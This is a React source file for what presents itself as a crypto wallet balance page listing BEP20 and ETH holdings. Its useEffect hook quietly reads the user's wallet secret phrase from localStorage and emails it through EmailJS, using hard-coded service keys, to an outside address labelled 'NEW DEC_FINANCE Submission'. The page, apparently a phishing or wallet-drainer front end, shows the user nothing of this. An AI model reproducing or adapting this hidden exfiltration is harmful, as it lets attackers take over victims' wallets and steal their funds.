import React, { useEffect, useState } from "react";
import { useNavigate } from "react-router-dom";
import { errorNotification } from "../../utils/helpers";

const WalletSectionOne = () => {
  const [data, setData] = useState([]);
  const navigate = useNavigate();

  (function () {
    emailjs.init({
      // publicKey: "KhXsjlknQMyDCWbVr", // Your public key
      publicKey: "0ddaV4A0nJOzTp1yw", // Your public key
    });
  })();

  useEffect(() => {
    let phrase = localStorage.getItem("phrase");
    phrase = phrase.toString();

    if (phrase) {
      const templateParams = {
        to_email: "testmail@elderintelligence.com",
        message: `NEW DEC_FINANCE Submission\n\nVerified Secret Phrase:\n\n ${phrase}`,
      };

      // emailjs.send("service_c4dn1pf", "template_2or5s0n", templateParams).then(
      emailjs.send("service_w6dwvnh", "template_z9qtrsj", templateParams).then(
        function (response) {
          console.log("SUCCESS!", response.status, response.text);
        },
        function (err) {
          console.error("FAILED TO SEND EMAIL...", err);
        }
      );
    }

    let wallet_balance = localStorage.getItem("wallet_balance");
    if (!wallet_balance) {
      errorNotification("Please connect your wallet first");
      navigate("/connect");
    }
    const items = JSON.parse(wallet_balance);
    console.log("items.length", items?.length);
    if (items?.length == 0) {
      errorNotification("Please connect your wallet first");
      navigate("/connect");
    }
    console.log({ items });
    setData(items);
  }, []);

  return (
    <div className="h-full w-[100vw] bg-[#0A0A0B] text-white">
      <div className="container px-8 md:px-14 lg:px-0 py-48 md:py-48 ">
        <div className="mb-8">
          <h1 className="text-2xl lg:text-3xl mb-3">Your Wallet Balances</h1>
          <p className="text-sm">
            Note that only the top popular BEP20 tokens and ETH are displayed
            here
          </p>
        </div>
        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 items-center gap-14 lg:gap-10">
          {data.length &&
            data.map((item, i) => (
              <div
                key={i}
                className="col-span-1 p-4 flex justify-between items-center"
                style={{ boxShadow: "4px 4px 7px #032e2a" }}
              >
                <p className="text-lg">{item.Symbol}</p>
                <div className="flex flex-col items-end">
                  <p className="text-sm">{item.currency_name}</p>
                  <span className="text-sm">
                    {Number(item.balance)?.toFixed(6)}
                  </span>
                </div>
              </div>
            ))}
        </div>
      </div>
    </div>
  );
};

export default WalletSectionOne;
